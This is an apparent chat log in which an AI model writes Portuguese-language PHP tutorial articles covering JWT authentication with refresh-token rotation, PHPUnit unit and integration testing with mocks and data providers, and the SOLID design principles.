    public function login(array $params): void
    {
        $corpo = $this->lerCorpo();

        if (empty($corpo['email']) || empty($corpo['senha'])) {
            Resposta::badRequest('Email e senha são obrigatórios.');
        }

        $usuario = $this->usuarios->buscarPorEmail($corpo['email']);

        // Sempre verificar com password_verify mesmo se usuário não existe
        // (evita timing attack que revela quais emails estão cadastrados)
        $senhaCorreta = $usuario !== null
            && password_verify($corpo['senha'], $usuario->senhaHash);

        if (!$senhaCorreta) {
            Resposta::erro(401, 'Credenciais inválidas.');
        }

        if (!$usuario->ativo) {
            Resposta::erro(403, 'Conta desativada. Entre em contato com o suporte.');
        }

        // Emite os dois tokens
        $accessToken  = $this->jwt->emitirTokenDeAcesso($usuario->id, $usuario->perfil, $usuario->email);
        $refreshToken = $this->jwt->emitirRefreshToken($usuario->id);

        // Persiste o refresh token (necessário para revogação)
        $this->refreshTokens->salvar(
            usuarioId: $usuario->id,
            token:     $refreshToken,
            expiresAt: new \DateTimeImmutable('+7 days'),
        );

        Resposta::ok([
            'access_token'  => $accessToken,
            'refresh_token' => $refreshToken,
            'tipo'          => 'Bearer',
            'expira_em'     => 900, // segundos
            'usuario' => [
                'id'     => $usuario->id,
                'nome'   => $usuario->nome,
                'email'  => $usuario->email,
                'perfil' => $usuario->perfil,
            ],
        ]);
    }

    // POST /api/auth/refresh
    public function refresh(array $params): void
    {
        $corpo = $this->lerCorpo();

        if (empty($corpo['refresh_token'])) {
            Resposta::badRequest('refresh_token é obrigatório.');
        }

        $resultado = $this->jwt->verificarComTratamento($corpo['refresh_token']);

        if (!$resultado['valido']) {
            Resposta::erro(401, 'Refresh token inválido ou expirado.');
        }

        $payload = $resultado['payload'];

        // Verifica se é um refresh token (não um access token)
        if (($payload->tipo ?? '') !== 'refresh') {
            Resposta::erro(401, 'Token inválido para esta operação.');
        }

        // Verifica se o token não foi revogado no banco
        if (!$this->refreshTokens->existe($corpo['refresh_token'])) {
            Resposta::erro(401, 'Refresh token revogado.');
        }

        $usuarioId = (int) $payload->sub;
        $usuario   = $this->usuarios->buscarPorId($usuarioId);

        if ($usuario === null || !$usuario->ativo) {
            Resposta::erro(401, 'Usuário não encontrado ou desativado.');
        }

        // Rotação de refresh token — invalida o antigo, emite novo
        $this->refreshTokens->revogar($corpo['refresh_token']);
        $novoRefreshToken = $this->jwt->emitirRefreshToken($usuario->id);
        $this->refreshTokens->salvar(
            usuarioId: $usuario->id,
            token:     $novoRefreshToken,
            expiresAt: new \DateTimeImmutable('+7 days'),
        );

        Resposta::ok([
            'access_token'  => $this->jwt->emitirTokenDeAcesso($usuario->id, $usuario->perfil, $usuario->email),
            'refresh_token' => $novoRefreshToken,
            'tipo'          => 'Bearer',
            'expira_em'     => 900,
        ]);
    }

    // POST /api/auth/logout
    public function logout(array $params): void
    {
        $corpo = $this->lerCorpo();

        if (!empty($corpo['refresh_token'])) {
            $this->refreshTokens->revogar($corpo['refresh_token']);
        }

        Resposta::semConteudo();
    }

    private function lerCorpo(): array
    {
        $raw   = file_get_contents('php://input');
        $dados = json_decode($raw ?: '', associative: true);
        if (json_last_error() !== JSON_ERROR_NONE) Resposta::badRequest('JSON inválido.');
        return $dados ?? [];
    }
}
```

---

## Middleware de autenticação

```php
<?php
declare(strict_types=1);

class MiddlewareAutenticacao
{
    public function __construct(
        private readonly ServicoJWT $jwt,
    ) {}

    // Middleware que extrai e valida o Bearer token
    public function autenticar(array $params, callable $proximo): void
    {
        $authHeader = $_SERVER['HTTP_AUTHORIZATION'] ?? '';

        if (!str_starts_with($authHeader, 'Bearer ')) {
            Resposta::naoAutorizado('Token de autenticação não fornecido.');
        }

        $token     = substr($authHeader, 7); // remove "Bearer "
        $resultado = $this->jwt->verificarComTratamento($token);

        if (!$resultado['valido']) {
            $mensagens = [
                'token_expirado'          => 'Token expirado. Faça refresh ou login novamente.',
                'assinatura_invalida'     => 'Token com assinatura inválida.',
                'token_ainda_nao_valido'  => 'Token ainda não é válido.',
                'token_invalido'          => 'Token inválido.',
            ];
            Resposta::naoAutorizado($mensagens[$resultado['erro']] ?? 'Token inválido.');
        }

        $payload = $resultado['payload'];

        // Verifica se é um access token (não refresh token)
        if (($payload->tipo ?? '') !== 'access') {
            Resposta::naoAutorizado('Use o access token para autenticar requisições.');
        }

        // Injeta o usuário autenticado na superglobal de requisição
        // (em frameworks reais, isto vai para um objeto Request)
        $_REQUEST['usuario_autenticado'] = [
            'id'     => (int) $payload->sub,
            'perfil' => $payload->perfil,
            'email'  => $payload->email,
        ];

        $proximo($params);
    }

    // Middleware de autorização por perfil
    public function exigirPerfil(string ...$perfisPermitidos): callable
    {
        return function (array $params, callable $proximo) use ($perfisPermitidos): void {
            $usuario = $_REQUEST['usuario_autenticado'] ?? null;

            if ($usuario === null) {
                Resposta::naoAutorizado();
            }

            if (!in_array($usuario['perfil'], $perfisPermitidos, true)) {
                Resposta::proibido(
                    "Perfil '{$usuario['perfil']}' não tem permissão para esta operação."
                );
            }

            $proximo($params);
        };
    }
}

// ── Usando os middlewares no router ───────────────────────────────────
$auth    = new MiddlewareAutenticacao($jwt);
$router  = new Router();

// Rotas públicas — sem autenticação
$router->post('/api/auth/login',   [$authController, 'login']);
$router->post('/api/auth/refresh', [$authController, 'refresh']);
$router->post('/api/auth/logout',  [$authController, 'logout']);
$router->get ('/api/produtos',     [$produtoController, 'listar']);

// Rotas autenticadas
$router->post('/api/produtos', function(array $params) use ($auth, $produtoController): void {
    $auth->autenticar($params, fn($p) => $produtoController->criar($p));
});

// Rota apenas para admins
$router->delete('/api/usuarios/{id}', function(array $params) use ($auth, $usuarioController): void {
    $auth->autenticar($params, function($p) use ($auth, $usuarioController): void {
        $auth->exigirPerfil('admin')($p, fn($pp) => $usuarioController->deletar($pp));
    });
});
```

---

## Resumo do artigo

| Conceito | O que aprendemos |
|---|---|
| Estrutura JWT | Header + Payload + Assinatura em base64url — autocontido e verificável |
| Claims padrão | `sub`, `iss`, `exp`, `iat`, `jti` — sempre definir `exp` |
| HMAC-SHA256 | Assinatura simétrica — mesma chave para assinar e verificar |
| `hash_equals()` | Comparação resistente a timing attacks — nunca use `==` para tokens |
| Access token | TTL curto (15min) — carrega dados do usuário — não precisa de banco |
| Refresh token | TTL longo (7 dias) — armazenado no banco — permite rotação e revogação |
| Rotação de refresh | Cada refresh emite um novo refresh token e invalida o anterior |
| Middleware | Extrai e valida token — injeta usuário autenticado no contexto |
| Autorização | Middleware separado verifica perfil após autenticação |

---

## Exercício da semana

1. Implemente o `RefreshTokenRepositorio` com PDO: tabela `refresh_tokens` com colunas `token` (hash SHA-256 — nunca armazene o token em texto puro), `usuario_id`, `expires_at`, `revogado_em`. Métodos: `salvar()`, `existe()`, `revogar()`, `limparExpirados()`.

2. Adicione ao middleware um mecanismo de **token blacklist** em memória (usando APCu): quando o logout é chamado, armazene o `jti` do access token no APCu pelo tempo restante até expirar. O middleware verifica se o `jti` está na blacklist antes de autorizar.

3. Implemente o fluxo de **troca de senha**: `POST /api/auth/trocar-senha` recebe o token de acesso atual + senha atual + nova senha. Após trocar, revogue todos os refresh tokens do usuário (logout de todos os dispositivos).

4. Adicione **rate limiting por IP** no endpoint de login: máximo de 5 tentativas falhas em 15 minutos, usando APCu para controle. Após exceder, retornar `429 Too Many Requests` com header `Retry-After`.

5. **Desafio:** implemente autenticação com **RS256** (RSA): gere um par de chaves com `openssl_pkey_new()`, assine com a chave privada e verifique com a pública. Adapte o `ServicoJWT` para suportar ambos os algoritmos, configurável via construtor.

---

## Referências

- JWT.io — Debugger e especificação: https://jwt.io
- RFC 7519 — JSON Web Token: https://datatracker.ietf.org/doc/html/rfc7519
- firebase/php-jwt: https://github.com/firebase/php-jwt
- OWASP — JWT Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
- PHP Manual — password_hash / password_verify: https://www.php.net/manual/pt_BR/function.password-hash.php

---

Texto do Artigo 24 completo. Gerando o HTML.

Artigos 23 e 24 entregues. Progresso: **24/52 artigos completos**.

Módulo 5 (APIs REST) tem agora 2 artigos sólidos. Próximo: **Artigo 25 — Testes Automatizados com PHPUnit**, que abre o Módulo 6. Continuo?

---

# you asked

message time: 2026-03-09 08:45:07

Continue

---

# claude response

# Artigo 25 — Testes Automatizados com PHPUnit

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 25 · Módulo 6: Qualidade de Código

---

## Introdução

Testes automatizados são o mecanismo que permite modificar código com confiança. Sem testes, cada mudança é uma aposta — você só descobre que quebrou algo quando o cliente reclama. Com testes, a suite te avisa em segundos se algo regrediu.

PHPUnit é o framework de testes padrão do ecossistema PHP. Ele organiza testes em classes, oferece assertions expressivas, mocks para isolar dependências, e data providers para testar múltiplos cenários sem duplicar código. Neste artigo construímos testes unitários puros, testes de integração com banco real, e aprendemos a usar mocks para testar código que depende de serviços externos — sem precisar que eles existam.

---

## Configuração e estrutura de projeto

```xml
<!-- phpunit.xml — configuração do PHPUnit -->
<?xml version="1.0" encoding="UTF-8"?>
<phpunit xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:noNamespaceSchemaLocation="vendor/phpunit/phpunit/phpunit.xsd"
         bootstrap="vendor/autoload.php"
         colors="true"
         stopOnFailure="false">

    <testsuites>
        <testsuite name="Unit">
            <directory>tests/Unit</directory>
        </testsuite>
        <testsuite name="Integration">
            <directory>tests/Integration</directory>
        </testsuite>
    </testsuites>

    <coverage>
        <include>
            <directory suffix=".php">src</directory>
        </include>
    </coverage>

    <php>
        <env name="APP_ENV" value="testing"/>
        <env name="DB_DATABASE" value=":memory:"/>
    </php>
</phpunit>
```

```
projeto/
├── src/
│   ├── Domain/
│   │   ├── Produto.php
│   │   └── Carrinho.php
│   ├── Service/
│   │   └── CarrinhoService.php
│   └── Repository/
│       └── ProdutoRepositorioInterface.php
├── tests/
│   ├── Unit/
│   │   ├── Domain/
│   │   │   └── CarrinhoTest.php
│   │   └── Service/
│   │       └── CarrinhoServiceTest.php
│   └── Integration/
│       └── Repository/
│           └── ProdutoRepositorioPDOTest.php
├── phpunit.xml
└── composer.json
```

---

## Primeiro teste — entidade de domínio

Testes unitários testam uma única unidade de código em isolamento, sem banco de dados, sem HTTP, sem arquivos. São os mais rápidos e os mais valiosos.

```php
<?php
declare(strict_types=1);

namespace App\Domain;

// ── Entidade que vamos testar ──────────────────────────────────────────
class Produto
{
    public function __construct(
        public readonly int    $id,
        public readonly string $nome,
        public readonly float  $preco,
        public readonly int    $estoque,
    ) {}

    public function comDesconto(float $percentual): static
    {
        if ($percentual < 0 || $percentual > 100) {
            throw new \InvalidArgumentException(
                "Percentual deve ser entre 0 e 100, recebido: {$percentual}"
            );
        }
        return new static(
            id:      $this->id,
            nome:    $this->nome,
            preco:   round($this->preco * (1 - $percentual / 100), 2),
            estoque: $this->estoque,
        );
    }

    public function temEstoque(int $quantidade = 1): bool
    {
        return $this->estoque >= $quantidade;
    }
}
```

```php
<?php
declare(strict_types=1);

namespace Tests\Unit\Domain;

use App\Domain\Produto;
use PHPUnit\Framework\TestCase;

class ProdutoTest extends TestCase
{
    // Convenção: método de teste começa com "test" ou usa atributo #[Test]
    // Nome do método descreve o comportamento esperado

    public function test_desconto_calcula_preco_corretamente(): void
    {
        $produto    = new Produto(id: 1, nome: 'Teclado', preco: 200.00, estoque: 10);
        $comDesconto = $produto->comDesconto(10); // 10%

        $this->assertSame(180.00, $comDesconto->preco);
        $this->assertSame(1, $comDesconto->id);    // imutável — mantém o ID
        $this->assertSame('Teclado', $comDesconto->nome);
    }

    public function test_desconto_zero_nao_altera_preco(): void
    {
        $produto = new Produto(id: 1, nome: 'Mouse', preco: 150.00, estoque: 5);
        $this->assertSame(150.00, $produto->comDesconto(0)->preco);
    }

    public function test_desconto_100_resulta_em_preco_zero(): void
    {
        $produto = new Produto(id: 1, nome: 'Fone', preco: 300.00, estoque: 3);
        $this->assertSame(0.00, $produto->comDesconto(100)->preco);
    }

    public function test_desconto_invalido_lanca_excecao(): void
    {
        $produto = new Produto(id: 1, nome: 'Monitor', preco: 1800.00, estoque: 2);

        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('Percentual deve ser entre 0 e 100');

        $produto->comDesconto(150); // inválido
    }

    public function test_tem_estoque_retorna_true_quando_suficiente(): void
    {
        $produto = new Produto(id: 1, nome: 'SSD', preco: 400.00, estoque: 5);

        $this->assertTrue($produto->temEstoque(1));
        $this->assertTrue($produto->temEstoque(5));
        $this->assertFalse($produto->temEstoque(6));
    }

    public function test_tem_estoque_retorna_false_quando_zerado(): void
    {
        $produto = new Produto(id: 1, nome: 'RAM', preco: 250.00, estoque: 0);
        $this->assertFalse($produto->temEstoque());
    }
}
```

---

## Data Providers — testando múltiplos cenários

Data Providers eliminam a repetição de testes similares. Em vez de escrever um teste por caso, você declara os dados e o PHPUnit executa o mesmo método para cada conjunto.

```php
<?php
declare(strict_types=1);

namespace Tests\Unit\Domain;

use App\Domain\Produto;
use PHPUnit\Framework\TestCase;
use PHPUnit\Framework\Attributes\DataProvider;

class ProdutoDescontoTest extends TestCase
{
    // PHP 8.x syntax: atributo #[DataProvider] no lugar de @dataProvider
    #[DataProvider('provedorDescontosValidos')]
    public function test_desconto_valido(float $preco, float $percentual, float $esperado): void
    {
        $produto     = new Produto(id: 1, nome: 'Produto', preco: $preco, estoque: 10);
        $comDesconto = $produto->comDesconto($percentual);
        $this->assertSame($esperado, $comDesconto->preco);
    }

    public static function provedorDescontosValidos(): array
    {
        return [
            'desconto 10% em R$200'   => [200.00, 10,  180.00],
            'desconto 25% em R$100'   => [100.00, 25,   75.00],
            'desconto 50% em R$300'   => [300.00, 50,  150.00],
            'desconto 0% mantém preço'=> [150.00,  0,  150.00],
            'desconto 100% zera preço'=> [500.00, 100,   0.00],
        ];
    }

    #[DataProvider('provedorDescontosInvalidos')]
    public function test_desconto_invalido_lanca_excecao(float $percentual): void
    {
        $produto = new Produto(id: 1, nome: 'Produto', preco: 100.00, estoque: 10);

        $this->expectException(\InvalidArgumentException::class);
        $produto->comDesconto($percentual);
    }

    public static function provedorDescontosInvalidos(): array
    {
        return [
            'negativo'      => [-1.0],
            'maior que 100' => [101.0],
            'muito alto'    => [999.0],
        ];
    }
}
```

---

## Mocks — testando com dependências isoladas

Mocks substituem dependências reais por objetos controlados. Isso permite testar o comportamento de uma classe sem que ela precise de banco de dados, API externa ou qualquer infraestrutura.

```php
<?php
declare(strict_types=1);

namespace App\Service;

use App\Domain\Produto;
use App\Repository\ProdutoRepositorioInterface;
use App\Service\NotificacaoService;

class CarrinhoService
{
    public function __construct(
        private readonly ProdutoRepositorioInterface $repositorio,
        private readonly NotificacaoService          $notificacao,
    ) {}

    public function adicionarAoCarrinho(int $produtoId, int $quantidade): array
    {
        $produto = $this->repositorio->buscarPorId($produtoId);

        if ($produto === null) {
            throw new \RuntimeException("Produto #{$produtoId} não encontrado.");
        }

        if (!$produto->temEstoque($quantidade)) {
            throw new \RuntimeException(
                "Estoque insuficiente. Disponível: {$produto->estoque}, solicitado: {$quantidade}"
            );
        }

        // Notifica se estoque ficará baixo após a compra
        if ($produto->estoque - $quantidade <= 3) {
            $this->notificacao->alertarEstoqueBaixo($produto);
        }

        return [
            'produto'    => ['id' => $produto->id, 'nome' => $produto->nome],
            'quantidade' => $quantidade,
            'subtotal'   => round($produto->preco * $quantidade, 2),
        ];
    }
}
```

```php
<?php
declare(strict_types=1);

namespace Tests\Unit\Service;

use App\Domain\Produto;
use App\Repository\ProdutoRepositorioInterface;
use App\Service\CarrinhoService;
use App\Service\NotificacaoService;
use PHPUnit\Framework\TestCase;
use PHPUnit\Framework\MockObject\MockObject;

class CarrinhoServiceTest extends TestCase
{
    private ProdutoRepositorioInterface&MockObject $repositorio;
    private NotificacaoService&MockObject          $notificacao;
    private CarrinhoService                        $servico;

    // setUp() é executado antes de CADA método de teste
    protected function setUp(): void
    {
        $this->repositorio = $this->createMock(ProdutoRepositorioInterface::class);
        $this->notificacao = $this->createMock(NotificacaoService::class);
        $this->servico     = new CarrinhoService($this->repositorio, $this->notificacao);
    }

    public function test_adicionar_produto_retorna_item_correto(): void
    {
        $produto = new Produto(id: 42, nome: 'Teclado', preco: 200.00, estoque: 10);

        // Configura o mock: quando buscarPorId(42) for chamado, retorna $produto
        $this->repositorio
            ->expects($this->once())       // deve ser chamado exatamente 1 vez
            ->method('buscarPorId')
            ->with(42)                     // com este argumento
            ->willReturn($produto);

        // Notificação NÃO deve ser chamada (estoque 10 - 2 = 8, não é baixo)
        $this->notificacao
            ->expects($this->never())
            ->method('alertarEstoqueBaixo');

        $resultado = $this->servico->adicionarAoCarrinho(produtoId: 42, quantidade: 2);

        $this->assertSame(42, $resultado['produto']['id']);
        $this->assertSame('Teclado', $resultado['produto']['nome']);
        $this->assertSame(2, $resultado['quantidade']);
        $this->assertSame(400.00, $resultado['subtotal']);
    }

    public function test_adicionar_produto_inexistente_lanca_excecao(): void
    {
        $this->repositorio
            ->method('buscarPorId')
            ->willReturn(null);

        $this->expectException(\RuntimeException::class);
        $this->expectExceptionMessage('não encontrado');

        $this->servico->adicionarAoCarrinho(produtoId: 999, quantidade: 1);
    }

    public function test_adicionar_sem_estoque_suficiente_lanca_excecao(): void
    {
        $produto = new Produto(id: 1, nome: 'SSD', preco: 400.00, estoque: 2);

        $this->repositorio->method('buscarPorId')->willReturn($produto);

        $this->expectException(\RuntimeException::class);
        $this->expectExceptionMessage('Estoque insuficiente');

        $this->servico->adicionarAoCarrinho(produtoId: 1, quantidade: 5); // pede 5, tem 2
    }

    public function test_notificacao_e_disparada_quando_estoque_fica_baixo(): void
    {
        // Estoque = 4, quantidade = 2 → sobrará 2 (≤ 3) → deve notificar
        $produto = new Produto(id: 1, nome: 'Mouse', preco: 150.00, estoque: 4);

        $this->repositorio->method('buscarPorId')->willReturn($produto);

        // Agora o mock DEVE ser chamado — e com o produto correto
        $this->notificacao
            ->expects($this->once())
            ->method('alertarEstoqueBaixo')
            ->with($this->callback(fn($p) => $p->id === 1));

        $this->servico->adicionarAoCarrinho(produtoId: 1, quantidade: 2);
    }
}
```

---

## Teste de integração — com banco de dados real

Testes de integração verificam que o código funciona com a infraestrutura real. Usamos SQLite em memória para isolar e manter os testes rápidos.

```php
<?php
declare(strict_types=1);

namespace Tests\Integration\Repository;

use App\Domain\Produto;
use App\Repository\ProdutoRepositorioPDO;
use PHPUnit\Framework\TestCase;

class ProdutoRepositorioPDOTest extends TestCase
{
    private \PDO $pdo;
    private ProdutoRepositorioPDO $repositorio;

    protected function setUp(): void
    {
        // Banco em memória — zero custo, zero estado entre testes
        $this->pdo = new \PDO('sqlite::memory:');
        $this->pdo->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);

        // Cria o schema necessário para os testes
        $this->pdo->exec("
            CREATE TABLE produtos (
                id      INTEGER PRIMARY KEY AUTOINCREMENT,
                nome    TEXT    NOT NULL,
                preco   REAL    NOT NULL,
                estoque INTEGER NOT NULL DEFAULT 0,
                ativo   INTEGER NOT NULL DEFAULT 1
            )
        ");

        $this->repositorio = new ProdutoRepositorioPDO($this->pdo);
    }

    protected function tearDown(): void
    {
        // Banco em memória — descartado automaticamente; tearDown() aqui por clareza
        unset($this->pdo, $this->repositorio);
    }

    public function test_salvar_cria_produto_com_id(): void
    {
        $produto = new Produto(id: 0, nome: 'Teclado Mecânico', preco: 350.00, estoque: 10);
        $salvo   = $this->repositorio->salvar($produto);

        $this->assertGreaterThan(0, $salvo->id);
        $this->assertSame('Teclado Mecânico', $salvo->nome);
        $this->assertSame(350.00, $salvo->preco);
    }

    public function test_buscar_por_id_retorna_produto_correto(): void
    {
        $produto = $this->repositorio->salvar(
            new Produto(id: 0, nome: 'Mouse Gamer', preco: 180.00, estoque: 20)
        );

        $encontrado = $this->repositorio->buscarPorId($produto->id);

        $this->assertNotNull($encontrado);
        $this->assertSame($produto->id, $encontrado->id);
        $this->assertSame('Mouse Gamer', $encontrado->nome);
    }

    public function test_buscar_por_id_inexistente_retorna_null(): void
    {
        $this->assertNull($this->repositorio->buscarPorId(99999));
    }

    public function test_deletar_remove_produto(): void
    {
        $produto = $this->repositorio->salvar(
            new Produto(id: 0, nome: 'Fone Bluetooth', preco: 220.00, estoque: 5)
        );

        $this->repositorio->deletar($produto->id);
        $this->assertNull($this->repositorio->buscarPorId($produto->id));
    }

    public function test_buscar_ativos_retorna_apenas_ativos(): void
    {
        // Insere 2 ativos e 1 inativo diretamente no banco
        $this->pdo->exec("INSERT INTO produtos (nome, preco, estoque, ativo) VALUES
            ('Produto A', 100.00, 5, 1),
            ('Produto B', 200.00, 3, 1),
            ('Inativo',   150.00, 8, 0)
        ");

        $ativos = $this->repositorio->buscarAtivos();
        $this->assertCount(2, $ativos);

        $nomes = array_column(array_map(fn($p) => ['nome' => $p->nome], $ativos), 'nome');
        $this->assertContains('Produto A', $nomes);
        $this->assertContains('Produto B', $nomes);
        $this->assertNotContains('Inativo', $nomes);
    }
}
```

---

## Resumo do artigo

| Conceito | O que aprendemos |
|---|---|
| TestCase | Classe base do PHPUnit — cada método `test_*` é um teste independente |
| setUp() | Executado antes de cada teste — prepara estado comum |
| tearDown() | Executado após cada teste — limpa recursos |
| Assertions | `assertSame`, `assertTrue`, `assertNull`, `assertCount`, `expectException` |
| Data Provider | `#[DataProvider]` — testa múltiplos cenários sem duplicar código |
| Mock | `createMock()` — substitui dependências por objetos controlados |
| `expects()` | Verifica quantas vezes e com quais argumentos um método do mock foi chamado |
| Teste de integração | SQLite em memória — banco real, sem efeito colateral entre testes |

---

## Exercício da semana

1. Escreva testes unitários para a entidade `Carrinho`: métodos `adicionar(Produto, int)`, `remover(int $produtoId)`, `calcularTotal(): float` e `estaVazio(): bool`. Use Data Providers para testar `calcularTotal()` com múltiplos produtos.

2. Crie um mock do `ServicoJWT` para testar o `AuthController` sem emitir tokens reais. O mock deve simular cenários de token válido, expirado e inválido — verifique que o controller retorna os status HTTP corretos em cada caso.

3. Adicione cobertura de testes para o `QueryBuilder` construído no Artigo 21. Teste cada método (`where`, `whereIn`, `orderBy`, `limit`, `offset`) verificando o SQL gerado por `build()`.

4. Implemente um teste de integração para o `MigrationRunner`: rode as migrations em SQLite em memória e verifique que as tabelas foram criadas. Rode de novo e verifique que não há erro (idempotência). Execute `rollback()` e verifique que as tabelas foram removidas.

5. **Desafio:** configure cobertura de código com Xdebug ou PCOV e execute `vendor/bin/phpunit --coverage-html coverage/`. Identifique os caminhos de código não cobertos e escreva testes para atingir 90% de cobertura nos módulos `Domain` e `Service`.

---

## Referências

- PHPUnit — Documentação oficial: https://phpunit.de/documentation.html
- PHPUnit — Test Doubles (Mocks): https://docs.phpunit.de/en/11.5/test-doubles.html
- PHP Manual — PDO SQLite: https://www.php.net/manual/pt_BR/ref.pdo-sqlite.php
- Martin Fowler — Mocks Aren't Stubs: https://martinfowler.com/articles/mocksArentStubs.html

---

Texto do Artigo 25 completo. Gerando HTML.

# Artigo 26 — SOLID na Prática

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 26 · Módulo 6: Qualidade de Código

---

## Introdução

SOLID é um acrônimo para cinco princípios de design orientado a objetos formulados por Robert C. Martin. Eles não são regras rígidas — são diretrizes para escrever código que resiste ao tempo: fácil de estender, difícil de quebrar acidentalmente, e que comunica sua intenção com clareza.

Cada princípio resolve um problema específico que aparece quando sistemas crescem. Neste artigo, cada princípio é apresentado com um exemplo problemático e a versão corrigida — a diferença de qualidade fica imediatamente visível no código.

---

## S — Single Responsibility Principle

Uma classe deve ter apenas um motivo para mudar. Se uma classe faz mais de uma coisa, mudanças em qualquer uma dessas coisas podem quebrar as outras — e os testes ficam mais difíceis de escrever.

```php
<?php
declare(strict_types=1);

// ── PROBLEMA: UserManager faz tudo ───────────────────────────────────
class UserManager
{
    public function criarUsuario(array $dados): void
    {
        // 1. Valida dados
        if (empty($dados['email'])) throw new \InvalidArgumentException('Email obrigatório.');

        // 2. Salva no banco
        $pdo = new \PDO('mysql:host=localhost;dbname=app', 'root', '');
        $pdo->prepare('INSERT INTO usuarios (email) VALUES (?)')->execute([$dados['email']]);

        // 3. Envia email de boas-vindas
        mail($dados['email'], 'Bem-vindo!', 'Sua conta foi criada.');

        // 4. Registra log
        file_put_contents('app.log', "Usuário criado: {$dados['email']}\n", FILE_APPEND);
    }
    // Motivos para mudar: validação, acesso a dados, email, log — são 4 motivos
}

// ── SOLUÇÃO: cada classe com uma responsabilidade ─────────────────────
class ValidadorUsuario
{
    public function validar(array $dados): void
    {
        if (empty($dados['email']) || !filter_var($dados['email'], FILTER_VALIDATE_EMAIL)) {
            throw new \InvalidArgumentException('Email inválido.');
        }
        if (empty($dados['nome'])) {
            throw new \InvalidArgumentException('Nome obrigatório.');
        }
    }
}

class UsuarioRepositorio
{
    public function __construct(private readonly \PDO $pdo) {}

    public function salvar(array $dados): int
    {
        $stmt = $this->pdo->prepare('INSERT INTO usuarios (nome, email) VALUES (?, ?)');
        $stmt->execute([$dados['nome'], $dados['email']]);
        return (int) $this->pdo->lastInsertId();
    }
}

class EmailDeBoasVindas
{
    public function enviar(string $email, string $nome): void
    {
        // Em produção: usa biblioteca de email (PHPMailer, Symfony Mailer)
        mail($email, 'Bem-vindo!', "Olá {$nome}, sua conta foi criada.");
    }
}

// Orquestrador — usa as peças, mas não as implementa
class RegistroDeUsuarioService
{
    public function __construct(
        private readonly ValidadorUsuario   $validador,
        private readonly UsuarioRepositorio $repositorio,
        private readonly EmailDeBoasVindas  $emailBoasVindas,
    ) {}

    public function registrar(array $dados): int
    {
        $this->validador->validar($dados);
        $id = $this->repositorio->salvar($dados);
        $this->emailBoasVindas->enviar($dados['email'], $dados['nome']);
        return $id;
    }
}
```

---

## O — Open/Closed Principle

Classes devem ser abertas para extensão e fechadas para modificação. Quando um novo requisito chega, você adiciona código — não modifica o que já funciona e está testado.

```php
<?php
declare(strict_types=1);

// ── PROBLEMA: if/switch que cresce a cada novo tipo ───────────────────
class CalculadoraDeDesconto
{
    public function calcular(string $tipoCLiente, float $total): float
    {
        if ($tipoCliente === 'vip') {
            return $total * 0.20;
        } elseif ($tipoCliente === 'fidelidade') {
            return $total * 0.10;
        } elseif ($tipoCliente === 'funcionario') {
            return $total * 0.30;
        }
        // Para cada novo tipo, modifica esta classe — viola OCP
        return 0.0;
    }
}

// ── SOLUÇÃO: polimorfismo — nova regra = nova classe ──────────────────
interface RegraDeDesconto
{
    public function calcular(float $total): float;
    public function aplicavelA(string $tipoCliente): bool;
}

class DescontoVip implements RegraDeDesconto
{
    public function calcular(float $total): float { return $total * 0.20; }
    public function aplicavelA(string $t): bool   { return $t === 'vip'; }
}

class DescontoFidelidade implements RegraDeDesconto
{
    public function calcular(float $total): float { return $total * 0.10; }
    public function aplicavelA(string $t): bool   { return $t === 'fidelidade'; }
}

class DescontoFuncionario implements RegraDeDesconto
{
    public function calcular(float $total): float { return $total * 0.30; }
    public function aplicavelA(string $t): bool   { return $t === 'funcionario'; }
}

// Calculadora fechada para modificação — aberta para extensão via injeção
class CalculadoraDeDescontoOCP
{
    /** @param RegraDeDesconto[] $regras */
    public function __construct(private readonly array $regras = []) {}

    public function calcular(string $tipoCliente, float $total): float
    {
        foreach ($this->regras as $regra) {
            if ($regra->aplicavelA($tipoCliente)) {
                return $regra->calcular($total);
            }
        }
        return 0.0;
    }
}

// Adicionar novo tipo = criar nova classe, não tocar na calculadora
class DescontoEstudante implements RegraDeDesconto
{
    public function calcular(float $total): float { return $total * 0.05; }
    public function aplicavelA(string $t): bool   { return $t === 'estudante'; }
}

$calculadora = new CalculadoraDeDescontoOCP([
    new DescontoVip(),
    new DescontoFidelidade(),
    new DescontoFuncionario(),
    new DescontoEstudante(), // nova regra — zero modificação na calculadora
]);
```

---

## L — Liskov Substitution Principle

Subtipos devem ser substituíveis por seus tipos base sem alterar a corretude do programa. Em PHP prático: se você aceita uma interface, qualquer implementação deve se comportar conforme o contrato — sem surpresas, sem restrições adicionais.

```php
<?php
declare(strict_types=1);

// ── PROBLEMA: subclasse viola o contrato ─────────────────────────────
class Retangulo
{
    public function __construct(
        protected float $largura,
        protected float $altura,
    ) {}

    public function setLargura(float $l): void { $this->largura = $l; }
    public function setAltura(float $a): void  { $this->altura  = $a; }
    public function area(): float { return $this->largura * $this->altura; }
}

class Quadrado extends Retangulo
{
    // VIOLA LSP: setLargura altera AMBAS as dimensões — surpresa para o caller
    public function setLargura(float $l): void { $this->largura = $this->altura = $l; }
    public function setAltura(float $a): void  { $this->largura = $this->altura = $a; }
}

function calcularArea(Retangulo $r): float
{
    $r->setLargura(5);
    $r->setAltura(4);
    return $r->area();
    // Para Retangulo: retorna 20 — correto
    // Para Quadrado:  retorna 16 — viola a expectativa do caller!
}

// ── SOLUÇÃO: modelar corretamente o domínio ───────────────────────────
interface Forma
{
    public function area(): float;
    public function perimetro(): float;
}

final class Retangulo2 implements Forma
{
    public function __construct(
        private readonly float $largura,
        private readonly float $altura,
    ) {}

    public function area(): float      { return $this->largura * $this->altura; }
    public function perimetro(): float { return 2 * ($this->largura + $this->altura); }
}

final class Quadrado2 implements Forma
{
    public function __construct(private readonly float $lado) {}

    public function area(): float      { return $this->lado ** 2; }
    public function perimetro(): float { return 4 * $this->lado; }
}

// Qualquer Forma pode ser substituída — sem surpresas
function imprimirInfo(Forma $f): void
{
    echo "Área: {$f->area()}, Perímetro: {$f->perimetro()}\n";
}
```

---

## I — Interface Segregation Principle

Clientes não devem depender de interfaces que não usam. Interfaces gordas forçam implementações vazias ou lançam `UnsupportedOperationException` — sinal claro de violação.

```php
<?php
